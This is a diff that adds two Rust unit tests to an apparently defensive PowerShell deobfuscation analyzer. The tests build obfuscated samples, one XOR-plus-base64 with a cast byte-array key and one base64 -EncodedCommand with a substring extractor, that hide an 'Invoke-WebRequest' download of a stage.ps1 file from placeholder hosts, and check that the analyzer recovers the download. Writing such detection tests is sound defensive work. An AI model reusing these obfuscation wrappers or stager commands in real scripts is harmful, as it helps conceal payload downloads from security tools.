@@ -15252,6 +15252,79 @@ Unvertically '{blob}' 1"#
     }
 
     #[test]
+    fn ps1_xor_base64_extractor_accepts_cast_byte_array_key() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let decoded = "Invoke-WebRequest -Uri https://ps-typed-xor-key.example/stage.ps1";
+        let blob = encode_xor_b64(decoded, key);
+        let script = format!(
+            r#"$omprioriteringen=[byte[]](117,107,110,107,107,101,108,105,103,101,115);
+function Unvertically ($pauver,$execute=0) {{
+  $out=0..($pauver.Length-1)|%{{ $pauver[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};
+  $out
+}}
+Unvertically '{blob}' 1"#
+        );
+        let report = analyze(
+            format!("powershell -Command \"{}\"\r\n", script.replace('"', "`\"")).as_bytes(),
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-typed-xor-key.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "typed byte-array xor key was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_substring_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Pick '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-extractor-call.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal substring extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_hex_split_char_loop() {
         let ps = r#"$h = '40 65 63 68 6f 20 6f 66 66 0d 0a 65 63 68 6f 20 68 69' -Split ' ' | foreach {[char]([convert]::toint16($_,16))}; $s = $h -join ''"#;
         let normalized = crate::ps1_scan::normalize_ps1_text(ps);
